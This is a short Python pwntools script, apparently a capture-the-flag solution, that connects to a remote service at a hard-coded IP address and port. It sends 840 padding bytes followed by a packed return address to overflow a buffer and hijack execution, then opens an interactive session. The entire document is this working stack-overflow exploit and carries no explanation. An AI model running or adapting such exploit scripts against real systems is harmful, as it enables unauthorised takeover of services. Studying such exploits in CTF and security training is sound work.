from pwn import *

#r = remote("127.0.0.1", 8888)
r = remote("104.199.235.135", 2111)
context.arch = "amd64"

r.recvuntil("reciever: ")
r.sendline("a")
r.recvuntil("content: ")

payload = "a" * 840 + p64(0x400796)
r.sendline(payload)
r.interactive()

